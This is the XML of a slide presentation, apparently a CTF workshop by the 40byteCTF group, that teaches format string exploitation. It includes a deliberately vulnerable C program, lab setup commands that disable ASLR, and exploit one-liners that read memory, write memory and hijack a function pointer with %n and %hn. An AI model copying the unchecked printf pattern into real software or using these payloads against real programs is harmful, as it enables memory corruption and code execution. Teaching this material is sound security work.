                <text:p><text:span text:style-name="T11">%s – Takes the value on the stack as an address to a char[], and prints what is at this address until a null terminator.</text:span></text:p>
                <text:p><text:span text:style-name="T9">Often used to print memory as a string from any location, also used for padding printed characters for %n.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T11">%n – Takes the value on the stack as a memory address to an integer, and writes the current number of printed bytes to that address.</text:span></text:p>
                <text:p><text:span text:style-name="T9">Used to modify memory with attacker controlled values.</text:span></text:p>
                <text:p><text:span text:style-name="T5"/></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399cm" svg:y="0.836cm" presentation:class="title">
          <draw:text-box>
            <text:p>Challenge Structures and Macros</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr16" draw:text-style-name="P10" draw:layer="layout" svg:width="19.675cm" svg:height="4.027cm" svg:x="4.162cm" svg:y="6.603cm">
          <draw:text-box>
            <text:p text:style-name="P9"><text:span text:style-name="T9">#define PRINT_UI() printf("%s ", "You entered:"); \</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">printf(s-&gt;ui); \</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">printf("\n\n")</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T5"/></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr17" draw:text-style-name="P10" draw:layer="layout" svg:width="11.43cm" svg:height="7.803cm" svg:x="8.284cm" svg:y="11.175cm">
          <draw:text-box>
            <text:p text:style-name="P9"><text:span text:style-name="T9">typedef struct {</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">void (*fp)(void); </text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">unsigned int improtected;</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">char *canary;</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">unsigned int changeme;</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">char *ui;</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T9">} sploitme;</text:span></text:p>
            <text:p text:style-name="P9"><text:span text:style-name="T5"/></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399cm" svg:y="0.836cm" presentation:class="title">
          <draw:text-box>
            <text:p>Exploit Environment Setup</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr18" draw:text-style-name="P10" draw:layer="layout" svg:width="19.675cm" svg:height="10.635cm" svg:x="4.162cm" svg:y="6.603cm">
          <draw:text-box>
            <text:list text:style-name="L1">
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T9">Linux 32 bit distro – recent kernel</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T9">ALSR off.</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p text:style-name="P9"><text:span text:style-name="T12">sudo sysctl -w kernel.randomize_va_space=0</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T9">Core dumps on and full output</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p text:style-name="P9"><text:span text:style-name="T13">sysctl kernel.core_uses_pid=1 &gt;/dev/null 2&gt;&amp;1</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p text:style-name="P9"><text:span text:style-name="T13">sysctl kernel.core_pattern=/tmp/core-%e-%s-%u-%g-%p-%t &gt;/dev/null 2&gt;&amp;1</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p text:style-name="P9"><text:span text:style-name="T13">sysctl fs.suid_dumpable=2 &gt;/dev/null 2&gt;&amp;1</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P11"><text:span text:style-name="T9">gdb and binutils / gcc installed</text:span></text:p>
              </text:list-item>
            </text:list>
            <text:p text:style-name="P9"><text:span text:style-name="T5"/></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Challenge 1</text:span><text:span text:style-name="T1"><text:line-break/></text:span><text:span text:style-name="T5">(Source)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr19" draw:text-style-name="P13" draw:layer="layout" svg:width="26.67cm" svg:height="16.066cm" svg:x="0.761cm" svg:y="3.855cm">
          <draw:text-box>
            <text:p text:style-name="P12"><text:span text:style-name="T9">void challenge_1(void) {</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">sploitme *s = reset_struct();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">printf("%s%s\n%s ",</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">"\nChallenge 1 - Reading Memory\n"</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">"In this challenge, you must read memory off the stack.\n"</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">"The specific key you are looking for is\n", s-&gt;canary,</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">"Buffer please:" </text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">FFLUSH(stdin);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">if (scanf("%s", (s-&gt;ui)) == EOF) {</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">print_exit("C1 - Failed to provide a valid string", errno, s);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">}</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">FFLUSH(stdin);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">PRINT_UI();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T9">FREE_S();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T9">}</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"/></text:p>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Challenge 1</text:span><text:span text:style-name="T1"><text:line-break/></text:span><text:span text:style-name="T5">(Exploit)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="25.199cm" svg:height="12.179cm" svg:x="1.399cm" svg:y="4.913cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T15">#/usr/bin/bash</text:span></text:p>
            <text:p><text:span text:style-name="T15"/></text:p>
            <text:p><text:span text:style-name="T15"># generate our string and test!</text:span></text:p>
            <text:p><text:span text:style-name="T15">python -c "print\ '%2\$s\r'"|./formatstrings 1</text:span></text:p>
            <text:p/>
          </draw:text-box>
        </draw:frame>
        <presentation:notes draw:style-name="dp2">
          <draw:page-thumbnail draw:style-name="gr1" draw:layer="layout" svg:width="13.968cm" svg:height="10.476cm" svg:x="3.81cm" svg:y="2.123cm" draw:page-number="12" presentation:class="page"/>
          <draw:frame presentation:style-name="pr7" draw:text-style-name="P14" draw:layer="layout" svg:width="17.271cm" svg:height="12.572cm" svg:x="2.159cm" svg:y="13.271cm" presentation:class="notes">
            <draw:text-box>
              <text:list text:style-name="L1">
                <text:list-item>
                  <text:p><text:span text:style-name="T16">some gdb commands</text:span></text:p>
                  <text:list>
                    <text:list-item>
                      <text:list>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">i file</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">break *0x[addr]</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">x/xw <text:s/>0x[addr] <text:s/>or <text:s/>$regname</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">x/i $pc (or $eip)</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">x/[number]xw <text:s/>$esp</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">si</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">i func</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">p &lt;func name&gt;</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">break &lt;func name&gt;</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">bt</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">i frame [num]</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">tty &lt;/dev/pts/&lt;int&gt;&gt;</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">i macro &lt;MACRO NAME&gt;</text:span></text:p>
                        </text:list-item>
                        <text:list-item>
                          <text:p><text:span text:style-name="T16">tui cmds</text:span></text:p>
                        </text:list-item>
                      </text:list>
                    </text:list-item>
                  </text:list>
                </text:list-item>
              </text:list>
            </draw:text-box>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="page13"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Challenge 1</text:span><text:span text:style-name="T5"><text:line-break/></text:span><text:span text:style-name="T5">(Objective)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:rect draw:style-name="gr3" draw:text-style-name="P7" draw:layer="layout" svg:width="10.694cm" svg:height="6.096cm" svg:x="7.619cm" svg:y="6.413cm">
          <text:p/>
        </draw:rect>
        <draw:frame draw:style-name="gr20" draw:text-style-name="P6" draw:layer="layout" svg:width="11.912cm" svg:height="2.139cm" svg:x="8.043cm" svg:y="4.342cm">
          <draw:text-box>
            <text:p text:style-name="P11"><text:span text:style-name="T5">Access the string at s-&gt;canary</text:span></text:p>
            <text:p text:style-name="P11"><text:span text:style-name="T5"><text:s text:c="2"/></text:span><text:span text:style-name="T5">stack ptr to s at <text:s/>0x0804b008</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id13" draw:id="id13" draw:layer="layout" svg:width="10.694cm" svg:height="1.524cm" svg:x="7.619cm" svg:y="10.985cm">
          <text:p text:style-name="P8">.....</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr21" draw:text-style-name="P8" draw:layer="layout" svg:width="10.694cm" svg:height="1.524cm" svg:x="7.619cm" svg:y="9.461cm">
          <text:p text:style-name="P8">(s-&gt;canary) 0x0804b828</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id14" draw:id="id14" draw:layer="layout" svg:width="10.694cm" svg:height="1.524cm" svg:x="7.619cm" svg:y="6.413cm">
          <text:p text:style-name="P8">user input-&gt;0x0804b020 (%2$s)</text:p>
        </draw:rect>
        <draw:connector draw:style-name="gr12" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.313cm" svg:y1="11.747cm" svg:x2="18.313cm" svg:y2="7.175cm" draw:start-shape="id13" draw:start-glue-point="1" draw:end-shape="id14" draw:end-glue-point="1" svg:d="m18313 11747h501v-4572h-501" svg:viewBox="0 0 502 4573">
          <text:p/>
        </draw:connector>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" draw:layer="layout" svg:width="10.694cm" svg:height="1.524cm" svg:x="7.619cm" svg:y="7.937cm">
          <text:p text:style-name="P8">0x080491ee (prev printf text)</text:p>
        </draw:rect>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Challenge 2</text:span><text:span text:style-name="T1"><text:line-break/></text:span><text:span text:style-name="T5">(Source)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr22" draw:text-style-name="P13" draw:layer="layout" svg:width="23.876cm" svg:height="16.604cm" svg:x="1.523cm" svg:y="3.809cm">
          <draw:text-box>
            <text:p text:style-name="P12"><text:span text:style-name="T14">void challenge_2(void) {</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">sploitme *s = reset_struct();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">printf("%s%s%8x\n%s ",</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">"\nChallenge 2 - Modifying Memory\n",</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">"This time, you will need to modify memory at the location\n",</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">&amp;(s-&gt;improtected),</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">"Buffer please:"</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">FFLUSH(stdin);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">if (scanf("%s", s-&gt;ui) == EOF) {</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">print_exit("C2 - Failed to provide a valid string", errno, s);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">}</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">FFLUSH(stdin);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">PRINT_UI();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">If (! strncmp(s-&gt;canary, CANARY, 21) &amp;&amp; s-&gt;improtected != IMPROTECTED) {</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">printf("%s", "Nice job, you win!\n");</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">}</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">else {</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">printf("%s", "Sorry, that was not correct\n");</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">}</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">FREE_S();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14">}</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"/></text:p>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Challenge 2</text:span><text:span text:style-name="T1"><text:line-break/></text:span><text:span text:style-name="T5">(Exploit)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:text-style-name="P16" draw:layer="layout" svg:width="26.723cm" svg:height="12.179cm" svg:x="0.454cm" svg:y="4.913cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P15"><text:span text:style-name="T17">#/usr/bin/bash</text:span></text:p>
            <text:p text:style-name="P15"><text:span text:style-name="T17"/></text:p>
            <text:p text:style-name="P15"><text:span text:style-name="T17"># generate our string and test!</text:span></text:p>
            <text:p><text:span text:style-name="T15">python -c "print '%x%x%n\r'"|./formatstrings 2</text:span></text:p>
            <text:p><text:span text:style-name="T15">or</text:span></text:p>
            <text:p><text:span text:style-name="T15">python -c "print '\x0c\xb0\x04\x08%3\$n'"|./formatstrings 2</text:span></text:p>
            <text:p><text:span text:style-name="T15"/></text:p>
            <text:p><text:span text:style-name="T15"/></text:p>
            <text:p><text:span text:style-name="T15"/></text:p>
            <text:p text:style-name="P15"><text:span text:style-name="T18"/></text:p>
          </draw:text-box>
        </draw:frame>
        <presentation:notes draw:style-name="dp2">
          <draw:page-thumbnail draw:style-name="gr1" draw:layer="layout" svg:width="13.968cm" svg:height="10.476cm" svg:x="3.81cm" svg:y="2.123cm" draw:page-number="15" presentation:class="page"/>
          <draw:frame presentation:style-name="pr4" draw:text-style-name="P1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Challenge 2</text:span><text:span text:style-name="T1"><text:line-break/></text:span><text:span text:style-name="T5">(Objective)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr20" draw:text-style-name="P6" draw:layer="layout" svg:width="13.97cm" svg:height="2.139cm" svg:x="7.014cm" svg:y="5.079cm">
          <draw:text-box>
            <text:p text:style-name="P11"><text:span text:style-name="T5">Modify the value at s-&gt;improtected</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:rect draw:style-name="gr3" draw:text-style-name="P7" draw:layer="layout" svg:width="10.694cm" svg:height="6.096cm" svg:x="7.62cm" svg:y="6.413cm">
          <text:p/>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" draw:layer="layout" svg:width="10.694cm" svg:height="1.524cm" svg:x="7.62cm" svg:y="9.451cm">
          <text:p text:style-name="P8">“This time you...” -&gt; 0x08049204</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr21" draw:text-style-name="P8" xml:id="id15" draw:id="id15" draw:layer="layout" svg:width="10.694cm" svg:height="1.524cm" svg:x="7.62cm" svg:y="10.985cm">
          <text:p text:style-name="P8">s-&gt;improtected: <text:s/>0x0804b00c</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id16" draw:id="id16" draw:layer="layout" svg:width="10.694cm" svg:height="1.524cm" svg:x="7.62cm" svg:y="6.413cm">
          <text:p text:style-name="P8">printf arg1 -&gt; 0x080491c7 (%s)</text:p>
        </draw:rect>
        <draw:connector draw:style-name="gr12" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.314cm" svg:y1="11.747cm" svg:x2="18.314cm" svg:y2="7.175cm" draw:start-shape="id15" draw:start-glue-point="1" draw:end-shape="id16" draw:end-glue-point="1" svg:d="m18314 11747h501v-4572h-501" svg:viewBox="0 0 502 4573">
          <text:p/>
        </draw:connector>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" draw:layer="layout" svg:width="10.694cm" svg:height="1.524cm" svg:x="7.62cm" svg:y="7.937cm">
          <text:p text:style-name="P8">user input -&gt; 0x0804b020</text:p>
        </draw:rect>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Challenge 3</text:span><text:span text:style-name="T1"><text:line-break/></text:span><text:span text:style-name="T5">(Source)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr23" draw:text-style-name="P13" draw:layer="layout" svg:width="19.05cm" svg:height="13.67cm" svg:x="4.274cm" svg:y="5.336cm">
          <draw:text-box>
            <text:p text:style-name="P12"><text:span text:style-name="T14">void challenge_3(void) {</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">sploitme *s = reset_struct();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">printf("%s ",</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">"\nChallenge 3 - Controlling Execution\n"</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">"There is no way to win...\n"</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">"Give up now:"</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">FFLUSH(stdin);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">if (scanf("%s", s-&gt;ui) == EOF) {</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">print_exit("C3 - Failed to provide a valid string", errno, s);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">}</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">FFLUSH(stdin);</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">PRINT_UI();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">(*(s-&gt;fp))();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T14">FREE_S();</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14">}</text:span></text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T14"/></text:p>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Challenge 3</text:span><text:span text:style-name="T1"><text:line-break/></text:span><text:span text:style-name="T5">(Exploit)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="25.199cm" svg:height="12.179cm" svg:x="1.399cm" svg:y="4.913cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T15">#/usr/bin/bash</text:span></text:p>
            <text:p><text:span text:style-name="T15">i=$(/usr/bin/python -c "print (int('$(objdump -d -j .text ./formatstrings|grep winning|cut -d ' ' -f1|cut -b5-)',16))")</text:span></text:p>
            <text:p><text:span text:style-name="T15"/></text:p>
            <text:p><text:span text:style-name="T15">python -c "print '%' + str($i) + 'd%7\$hn\r'"|./formatstrings 3|grep beat</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <presentation:notes draw:style-name="dp2">
          <draw:page-thumbnail draw:style-name="gr1" draw:layer="layout" svg:width="13.968cm" svg:height="10.476cm" svg:x="3.81cm" svg:y="2.123cm" draw:page-number="18" presentation:class="page"/>
          <draw:frame presentation:style-name="pr4" draw:text-style-name="P1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399cm" svg:y="0.836cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">Challenge 3</text:span><text:span text:style-name="T1"><text:line-break/></text:span><text:span text:style-name="T5">(Objective)</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:rect draw:style-name="gr3" draw:text-style-name="P7" draw:layer="layout" svg:width="9.652cm" svg:height="9.08cm" svg:x="8.712cm" svg:y="7.938cm">
          <text:p/>
        </draw:rect>
        <draw:rect draw:style-name="gr5" draw:text-style-name="P8" draw:layer="layout" svg:width="9.652cm" svg:height="1.016cm" svg:x="8.712cm" svg:y="14.986cm">
          <text:p text:style-name="P8">s-&gt;canary 0x0804b828</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr5" draw:text-style-name="P8" draw:layer="layout" svg:width="9.652cm" svg:height="1.016cm" svg:x="8.712cm" svg:y="13.97cm">
          <text:p text:style-name="P8"><text:s/>s-&gt;improtected 0xdeadbeef</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr5" draw:text-style-name="P8" xml:id="id17" draw:id="id17" draw:layer="layout" svg:width="9.652cm" svg:height="1.016cm" svg:x="8.712cm" svg:y="12.954cm">
          <text:p text:style-name="P8">s-&gt;fp <text:s/>0x08048cbe (losing)</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id18" draw:id="id18" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.712cm" svg:y="10.986cm">
          <text:p text:style-name="P8">“s” -&gt; 0x0804b008</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.712cm" svg:y="9.462cm">
          <text:p text:style-name="P8">... 5 more spots</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.712cm" svg:y="6.414cm">
          <text:p text:style-name="P8">printf arg -&gt; 0x0804b020</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.712cm" svg:y="7.938cm">
          <text:p text:style-name="P8">“You entered:” 0x080491f2</text:p>
        </draw:rect>
        <draw:connector draw:style-name="gr15" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.364cm" svg:y1="13.462cm" svg:x2="18.364cm" svg:y2="11.748cm" draw:start-shape="id17" draw:start-glue-point="1" draw:end-shape="id18" draw:end-glue-point="1" svg:d="m18364 13462h501v-1714h-501" svg:viewBox="0 0 502 1715">
          <text:p/>
        </draw:connector>
        <draw:frame draw:style-name="gr20" draw:text-style-name="P6" draw:layer="layout" svg:width="13.533cm" svg:height="2.139cm" svg:x="7.233cm" svg:y="5.08cm">
          <draw:text-box>
            <text:p text:style-name="P11"><text:span text:style-name="T5">Modify the function pointer at s-&gt;fp</text:span></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3.506cm" svg:x="1.399cm" svg:y="0.836cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">Final Thoughts &amp; Questions</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:text-style-name="P2" draw:layer="layout" svg:width="11.808cm" svg:height="4.139cm" svg:x="8.095cm" svg:y="7.29cm">
          <draw:text-box>
            <text:p text:style-name="P1"><text:span text:style-name="T2">@40byteCTF</text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T2">github.com/40bytectf</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr3" draw:text-style-name="P4" draw:layer="layout" svg:width="11.684cm" svg:height="4.813cm" svg:x="1.269cm" svg:y="10.898cm">
          <draw:text-box>
            <text:p text:style-name="P3"><text:span text:style-name="T3">Chad Rikansrud</text:span></text:p>
            <text:p text:style-name="P3"><text:span text:style-name="T3">@zhroom_42</text:span></text:p>
            <text:p text:style-name="P3"><text:span text:style-name="T3">github.com/zhroom</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr3" draw:text-style-name="P4" draw:layer="layout" svg:width="12.7cm" svg:height="4.813cm" svg:x="13.969cm" svg:y="10.934cm">
          <draw:text-box>
            <text:p text:style-name="P3"><text:span text:style-name="T3">Spenser Reinhardt</text:span></text:p>
            <text:p text:style-name="P3"><text:span text:style-name="T3">@c0mmiebstrd</text:span></text:p>
            <text:p text:style-name="P3"><text:span text:style-name="T3">github.com/commiebstrd</text:span></text:p>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Mono1" svg:font-family="FreeMono"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780000004B0D5A31215.jp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2.179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27T13:42:35.051381855</meta:creation-date>
    <dc:date>2015-01-08T12:11:55.930010707</dc:date>
    <meta:editing-duration>PT4H41M28S</meta:editing-duration>
    <meta:editing-cycles>17</meta:editing-cycles>
    <meta:generator>LibreOffice/4.1.0.4$Linux_x86 LibreOffice_project/410m0$Build-4</meta:generator>
    <meta:document-statistic meta:object-count="163"/>
  </office:meta>
</office:document-meta>
</file>